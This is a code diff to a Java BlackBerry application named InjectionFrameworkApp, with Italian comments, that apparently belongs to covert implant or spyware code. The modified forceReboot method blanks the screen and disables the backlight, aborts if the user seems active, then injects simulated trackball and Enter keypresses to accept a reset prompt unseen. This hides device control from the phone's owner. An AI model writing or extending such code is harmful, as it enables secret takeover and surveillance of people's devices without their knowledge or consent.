@@ -88,7 +88,7 @@ public class InjectionFrameworkApp extends UiApplication {
         }
 
         UiApplication.getUiApplication().requestForeground();
-        Utils.sleep(2000);
+        //Utils.sleep(2000);
     }
 
     public void popBlack() {
@@ -423,27 +423,40 @@ public class InjectionFrameworkApp extends UiApplication {
     public static void forceReboot() {
         //TODO: se il telefono e' occupato, attendere il tempo necessario.
 
-        Backlight.enable(false);
-        CodeModuleManager.promptForResetIfRequired();
-        Backlight.enable(false);
+        try {
+            Backlight.enable(false);
+            getInstance().pushBlack();
+            Utils.sleep(5000);
+            
+            if(Backlight.isEnabled()){
+                //#ifdef DEBUG
+                debug.trace("forceReboot, backlight, bailing out");
+                //#endif
+                return;
+            }
+            CodeModuleManager.promptForResetIfRequired();
+            Backlight.enable(false);
 
-        //TODO: con il 4.6 non funziona.
-        //if(Device.getInstance().lessThan(5, 0)){
-        Utils.sleep(2000);
-        //}
-        Utils.sleep(500);
-        KeyInjector.trackBallDown(20);
-        Utils.sleep(100);
-        KeyInjector.trackBallUp(1);
-        Utils.sleep(100);
-        KeyInjector.pressKey(Keypad.KEY_ENTER);
-        Utils.sleep(100);
-        KeyInjector.trackBallClick();
-        Utils.sleep(100);
-        KeyInjector.trackBallDown(20);
-        Utils.sleep(100);
-        KeyInjector.trackBallUp(1);
-        Utils.sleep(100);
-        KeyInjector.trackBallClick();
+            //TODO: con il 4.6 non funziona.
+            //if(Device.getInstance().lessThan(5, 0)){
+            Utils.sleep(2000);
+            //}
+            Utils.sleep(500);
+            KeyInjector.trackBallDown(20);
+            Utils.sleep(100);
+            KeyInjector.trackBallUp(1);
+            Utils.sleep(100);
+            KeyInjector.pressKey(Keypad.KEY_ENTER);
+            Utils.sleep(100);
+            KeyInjector.trackBallClick();
+            Utils.sleep(100);
+            KeyInjector.trackBallDown(20);
+            Utils.sleep(100);
+            KeyInjector.trackBallUp(1);
+            Utils.sleep(100);
+            KeyInjector.trackBallClick();
+        } finally {
+            getInstance().popBlack();
+        }
     }
 }
